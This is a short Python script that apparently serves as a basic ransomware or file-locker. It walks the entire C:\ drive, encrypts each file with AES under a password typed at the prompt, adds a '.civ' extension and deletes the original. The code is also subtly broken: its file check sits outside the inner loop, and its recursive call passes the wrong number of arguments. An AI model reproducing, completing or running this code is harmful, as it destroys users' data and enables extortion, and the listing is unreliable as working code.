import os
import pyAesCrypt


def encryption(file, password):
    # instant buffer
    buffer_size = 512 * 1024

    pyAesCrypt.encryptFile(str(file),
                           str(file) + ".civ",
                           password,
                           buffer_size)
    print("[file] '" + os.path.splitext(file)[0] + "' encrypted !")
    # delete original file
    os.remove(file)


def steps_on_dir(password):
    for root, dirs, files in os.walk("C:\\"):
        for name in os.scandir(root):
            path = os.path.join(root, name)

        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as Ex:
                print(Ex)
        else:
            steps_on_dir(root, password)


password = input('enter password: ')
steps_on_dir(password)
